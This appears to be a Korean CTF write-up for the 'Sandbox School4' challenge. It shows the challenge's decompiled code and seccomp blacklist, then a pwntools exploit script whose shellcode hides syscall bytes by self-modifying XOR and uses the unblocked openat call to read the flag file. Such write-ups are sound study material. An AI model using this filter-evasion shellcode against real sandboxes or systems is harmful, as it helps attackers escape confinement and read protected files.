---
title: "2018 TenDollar CTF Sandbox School4"
date: 2020-2-13
ctf: TenDollar CTF
layout: post
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  signed int i; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = mmap(0LL, 4096uLL, 7, 34, -1, 0LL);
  if ( buf == -1LL )
  {
    puts("[err] Please, let me know this issue (hackability@naver.com)");
    result = -1;
  }
  else
  {
    puts("[*] Welcome to sandbox school :)");
    puts("[*] Put your shellcode as binary stream. I'll ready for your input as read(0, map, 1024)");
    puts("[*] Lv   : Troll");
    puts("[*] Desc : Now, you can't see me.");
    printf("> ", 4096LL);
    alarm(0xAu);
    read(0, buf, 1024uLL);
    for ( i = 0; i <= 1022; ++i )
    {
      if ( *(buf + i) == 15 && *(buf + i + 1) == 5 )
      {
        puts("[*] blocked !");
        return -1;
      }
    }
    install_syscall_filter();
    (buf)(0LL, buf);
    result = 0;
  }
  return result;
}
```

블랙리스트 기반으로 필터링걸려있다. openat이나 execveat를 막지않고 있다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

이게 로컬에서 풀다보니까 openat할때 rsi에 상대 경로를 넣었는데 *pathname 이 상대경로인 경우에 dirfd 를 기준으로 상대경로를 찾는다. 그래서 절대경로로 넣어줘야한다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
e = ELF('./sb4')
p = process('./sb4')

s='''
movabs rdi, 0x00000067616c662f
push rdi
push rsp
pop rsi
mov rax, 257
mov rdi, 0
xor rdx, rdx
xor word ptr[rip], 0x959f
nop
nop

add rsp, 2000

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 100
xor word ptr[rip], 0x959f
nop
nop

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 100
xor word ptr[rip], 0x959f
nop
nop
'''

# raw_input()
p.sendafter('>',asm(s))

p.interactive()
```

